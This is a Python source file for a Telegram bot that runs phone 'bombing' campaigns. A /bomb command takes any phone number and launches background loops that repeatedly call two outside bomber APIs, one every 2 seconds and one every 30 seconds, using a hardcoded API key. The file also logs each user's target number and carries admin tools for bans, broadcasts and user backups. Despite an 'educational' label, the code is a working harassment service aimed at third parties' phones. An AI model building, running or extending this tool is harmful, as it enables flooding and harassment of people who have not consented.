import os
import logging
import asyncio
import json
import io
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
import aiohttp
from database import (
    init_db, add_user, is_admin, is_owner, ban_user, unban_user, delete_user,
    get_all_users_paginated, get_recent_users_paginated, get_user_by_id,
    update_user_target, get_user_target, set_admin_role, get_user_count, get_all_user_ids
)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))
PORT = int(os.getenv("PORT", 10000))
WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL")
if not WEBHOOK_URL:
    WEBHOOK_URL = "https://bomber-2hra.onrender.com"   # fallback – will be replaced by Render's env

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ------------------------------------------------------------------
# API Configuration (fake bomber)
# ------------------------------------------------------------------
API1_URL = "https://bomber.kingcc.qzz.io/bomb"
API1_STOP_URL = "https://bomber.kingcc.qzz.io/stop"
API_KEY = "urfaaan_omdivine"
API2_URL = "https://bomm.gauravcyber0.workers.dev/"

# active bombing sessions: user_id -> dict with stop_event and tasks
active_bombings = {}
lock = asyncio.Lock()

# ------------------------------------------------------------------
# Bombing Session Functions
# ------------------------------------------------------------------
async def api1_loop(phone: str, stop_event: asyncio.Event):
    """Loop that hits API1 every 2 seconds."""
    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            try:
                url = f"{API1_URL}?key={API_KEY}&numbar={phone}"
                async with session.get(url) as resp:
                    await resp.text()
                    logger.info(f"API1 hit for {phone}")
            except Exception as e:
                logger.error(f"API1 error: {e}")
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=2)
            except asyncio.TimeoutError:
                continue

async def api2_loop(phone: str, stop_event: asyncio.Event):
    """Loop that hits API2 every 30 seconds."""
    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            try:
                url = f"{API2_URL}?phone={phone}"
                async with session.get(url) as resp:
                    await resp.text()
                    logger.info(f"API2 hit for {phone}")
            except Exception as e:
                logger.error(f"API2 error: {e}")
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=30)
            except asyncio.TimeoutError:
                continue

async def start_bombing(user_id: int, phone: str):
    """Start background bombing tasks for a user."""
    stop_event = asyncio.Event()
    task1 = asyncio.create_task(api1_loop(phone, stop_event))
    task2 = asyncio.create_task(api2_loop(phone, stop_event))
    async with lock:
        active_bombings[user_id] = {
            "stop_event": stop_event,
            "tasks": [task1, task2],
            "phone": phone
        }
    update_user_target(user_id, phone)

async def stop_bombing(user_id: int) -> bool:
    """Stop all bombing tasks for a user."""
    async with lock:
        session = active_bombings.pop(user_id, None)
        if not session:
            return False
        session["stop_event"].set()
        for task in session["tasks"]:
            task.cancel()
    update_user_target(user_id, None)
    return True

# ------------------------------------------------------------------
# Admin Decorator
# ------------------------------------------------------------------
def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_admin(user_id):
            # Silently ignore
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def owner_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_owner(user_id):
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ------------------------------------------------------------------
# Helper function to send any type of message (text or media)
# ------------------------------------------------------------------
async def send_any_message(context, chat_id, update, text=None):
    """
    Sends a message to chat_id. If the command was a reply to a message,
    copies that message. Otherwise sends the provided text.
    """
    if update.message.reply_to_message:
        try:
            await context.bot.copy_message(
                chat_id=chat_id,
                from_chat_id=update.effective_chat.id,
                message_id=update.message.reply_to_message.message_id
            )
            return True
        except Exception as e:
            logger.error(f"Failed to copy message: {e}")
            if text:
                await context.bot.send_message(chat_id=chat_id, text=text)
            return False
    else:
        if text:
            await context.bot.send_message(chat_id=chat_id, text=text)
            return True
    return False

# ------------------------------------------------------------------
# User Commands (public)
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.username, user.first_name)
    await update.message.reply_text(
        f"Welcome {user.first_name}! 🤖\n"
        f"Commands:\n/bomb <number> - Start bombing (educational)\n/stop - Stop active bombing\n/menu - Show menu"
    )

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /bomb <phone_number>")
        return
    phone = ''.join(filter(str.isdigit, context.args[0]))
    if len(phone) < 10:
        await update.message.reply_text("Invalid number. At least 10 digits.")
        return
    await stop_bombing(user_id)
    await start_bombing(user_id, phone)
    await update.message.reply_text(f"Bombing started on {phone}. Use /stop to stop.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if await stop_bombing(user_id):
        await update.message.reply_text("Bombing stopped.")
    else:
        await update.message.reply_text("No active bombing found.")

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        keyboard = [[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]
        await update.message.reply_text("Menu:", reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text("Menu:\nUse /bomb or /stop")

# ------------------------------------------------------------------
# Admin Commands (silent if not admin)
# ------------------------------------------------------------------
@admin_only
async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    try:
        target = int(context.args[0])
        if ban_user(target):
            await update.message.reply_text(f"User {target} banned.")
        else:
            await update.message.reply_text("User not found.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    try:
        target = int(context.args[0])
        if unban_user(target):
            await update.message.reply_text(f"User {target} unbanned.")
        else:
            await update.message.reply_text("User not found or not banned.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def delete_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /deleteuser <user_id>")
        return
    try:
        target = int(context.args[0])
        if delete_user(target):
            await update.message.reply_text(f"User {target} deleted.")
        else:
            await update.message.reply_text("User not found.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast a message (text or media) to all users."""
    text = " ".join(context.args) if context.args else None
    users = get_all_user_ids()
    success = 0
    for uid in users:
        if await send_any_message(context, uid, update, text):
            success += 1
    await update.message.reply_text(f"Broadcast sent to {success}/{len(users)} users.")

@admin_only
async def dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """DM a user (text or media). Usage: /dm <user_id> [message] or reply to a message."""
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /dm <user_id> [message] (or reply to a message)")
        return
    try:
        target = int(context.args[0])
        text = " ".join(context.args[1:]) if len(context.args) > 1 else None
        success = await send_any_message(context, target, update, text)
        if success:
            await update.message.reply_text(f"Message sent to {target}.")
        else:
            await update.message.reply_text("Failed to send. Check if user exists and bot can message them.")
    except Exception as e:
        await update.message.reply_text(f"Failed: {e}")

@admin_only
async def bulk_dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bulk DM to multiple users. Usage: /bulkdm id1,id2,... [message] (or reply)"""
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /bulkdm <id1,id2,...> [message] (or reply to a message)")
        return
    ids_str = context.args[0]
    ids = [int(x.strip()) for x in ids_str.split(",") if x.strip().isdigit()]
    if not ids:
        await update.message.reply_text("No valid user IDs.")
        return
    text = " ".join(context.args[1:]) if len(context.args) > 1 else None
    success = 0
    for uid in ids:
        if await send_any_message(context, uid, update, text):
            success += 1
    await update.message.reply_text(f"Sent to {success}/{len(ids)} users.")

@admin_only
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    page = 0
    if context.args and context.args[0].isdigit():
        page = int(context.args[0])
    users = get_all_users_paginated(page, 10)
    if not users:
        await update.message.reply_text("No users found.")
        return
    text = f"Users (page {page+1}):\n"
    for u in users:
        text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, {u['first_name'] or ''}\n"
    keyboard = []
    if page > 0:
        keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"list_users_page:{page-1}"))
    if len(users) == 10:
        keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"list_users_page:{page+1}"))
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)

@admin_only
async def recent_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    page = 0
    if context.args and context.args[0].isdigit():
        page = int(context.args[0])
    users = get_recent_users_paginated(page, 10)
    if not users:
        await update.message.reply_text("No recent users.")
        return
    text = f"Recent users (last 7 days) page {page+1}:\n"
    for u in users:
        text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, joined: {u['joined_at']}\n"
    keyboard = []
    if page > 0:
        keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"recent_users_page:{page-1}"))
    if len(users) == 10:
        keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"recent_users_page:{page+1}"))
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)

@admin_only
async def user_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /lookup <user_id>")
        return
    try:
        uid = int(context.args[0])
        user = get_user_by_id(uid)
        if not user:
            await update.message.reply_text("User not found.")
            return
        target = get_user_target(uid) or "None"
        text = f"User: {uid}\nUsername: @{user['username']}\nName: {user['first_name']}\nRole: {user['role']}\nBanned: {bool(user['banned'])}\nTarget number: {target}"
        await update.message.reply_text(text)
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_users_paginated(0, 999999)
    data = [dict(u) for u in users]
    backup_json = json.dumps(data, default=str, indent=2)
    file = io.BytesIO(backup_json.encode())
    file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    await update.message.reply_document(document=file, filename=file.name, caption="Backup of users.")

@owner_only
async def full_backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await backup(update, context)

@owner_only
async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addadmin <user_id>")
        return
    try:
        uid = int(context.args[0])
        set_admin_role(uid, True)
        await update.message.reply_text(f"User {uid} is now admin.")
    except:
        await update.message.reply_text("Invalid user ID.")

@owner_only
async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removeadmin <user_id>")
        return
    try:
        uid = int(context.args[0])
        set_admin_role(uid, False)
        await update.message.reply_text(f"User {uid} is no longer admin.")
    except:
        await update.message.reply_text("Invalid user ID.")

# ------------------------------------------------------------------
# Callback handlers for pagination
# ------------------------------------------------------------------
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data.startswith("list_users_page:"):
        page = int(data.split(":")[1])
        users = get_all_users_paginated(page, 10)
        if not users:
            await query.edit_message_text("No more users.")
            return
        text = f"Users (page {page+1}):\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, {u['first_name'] or ''}\n"
        keyboard = []
        if page > 0:
            keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"list_users_page:{page-1}"))
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"list_users_page:{page+1}"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    elif data.startswith("recent_users_page:"):
        page = int(data.split(":")[1])
        users = get_recent_users_paginated(page, 10)
        if not users:
            await query.edit_message_text("No more users.")
            return
        text = f"Recent users (page {page+1}):\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, joined: {u['joined_at']}\n"
        keyboard = []
        if page > 0:
            keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"recent_users_page:{page-1}"))
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"recent_users_page:{page+1}"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    elif data == "admin_panel":
        keyboard = [
            [InlineKeyboardButton("👥 List Users", callback_data="admin_list_users")],
            [InlineKeyboardButton("🕒 Recent Users", callback_data="admin_recent_users")],
            [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")],
        ]
        await query.edit_message_text("Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "admin_list_users":
        users = get_all_users_paginated(0, 10)
        if not users:
            await query.edit_message_text("No users.")
            return
        text = "Users (page 1):\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, {u['first_name'] or ''}\n"
        keyboard = []
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data="list_users_page:1"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    elif data == "admin_recent_users":
        users = get_recent_users_paginated(0, 10)
        if not users:
            await query.edit_message_text("No recent users.")
            return
        text = "Recent users (last 7 days) page 1:\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, joined: {u['joined_at']}\n"
        keyboard = []
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data="recent_users_page:1"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    elif data == "admin_stats":
        count = get_user_count()
        await query.edit_message_text(f"Total users: {count}")
    elif data == "back_to_menu":
        user_id = query.from_user.id
        if is_admin(user_id):
            keyboard = [[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]
            await query.edit_message_text("Menu:", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text("Menu:")
    else:
        await query.edit_message_text("Unknown action.")

# ------------------------------------------------------------------
# Error Handler
# ------------------------------------------------------------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

# ------------------------------------------------------------------
# Main Webhook Setup
# ------------------------------------------------------------------
def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    # Public commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("menu", menu))

    # Admin commands (silent if not admin)
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("deleteuser", delete_user_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("dm", dm))
    app.add_handler(CommandHandler("bulkdm", bulk_dm))
    app.add_handler(CommandHandler("listusers", list_users))
    app.add_handler(CommandHandler("recent", recent_users))
    app.add_handler(CommandHandler("lookup", user_lookup))
    app.add_handler(CommandHandler("backup", backup))

    # Owner-only commands
    app.add_handler(CommandHandler("fullbackup", full_backup))
    app.add_handler(CommandHandler("addadmin", add_admin))
    app.add_handler(CommandHandler("removeadmin", remove_admin))

    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)

    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}/webhook"
        logger.info(f"Starting webhook on {webhook_url}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path="webhook",
            webhook_url=webhook_url
        )
    else:
        logger.error("No WEBHOOK_URL set. Exiting.")
        exit(1)

if __name__ == "__main__":
    main()
